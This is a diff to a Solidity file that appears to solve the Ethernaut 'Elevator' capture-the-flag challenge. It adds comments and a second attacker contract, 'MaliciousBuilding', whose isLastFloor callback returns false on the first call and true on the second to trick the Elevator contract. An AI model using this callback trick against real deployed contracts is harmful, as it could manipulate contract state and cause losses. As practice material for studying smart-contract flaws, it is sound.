@@ -6,6 +6,7 @@ interface IElevator {
     function top() external view returns (bool);
 }
 
+// one way
 contract Hack {
     IElevator private immutable target;
     uint256 count;
@@ -19,7 +20,7 @@ contract Hack {
         require(target.top(), "not top");
     }
 
-    function isLastFloor(uint256) external returns (bool) {
+    function isLastFloor(uint256) external returns (bool) { // has to implement isLastFloor()
         count++;
         return count > 1; // return false 1st time then return true 2nd time
     }
@@ -28,6 +29,30 @@ contract Hack {
 interface Building {
   function isLastFloor(uint) external returns (bool);
 }
+
+
+// another way
+contract MaliciousBuilding is Building {
+    Elevator public elevator;
+    bool public toggle;
+
+    constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+        toggle = true;
+    }
+
+    function isLastFloor(uint) external override returns (bool) { // has to implement isLastFloor()
+        toggle = !toggle; 
+        return toggle; // return false 1st time then return true 2nd time
+    }
+
+    function attack() public {
+        elevator.goTo(1);
+    }
+}
+
+
+
 
 
 contract Elevator {
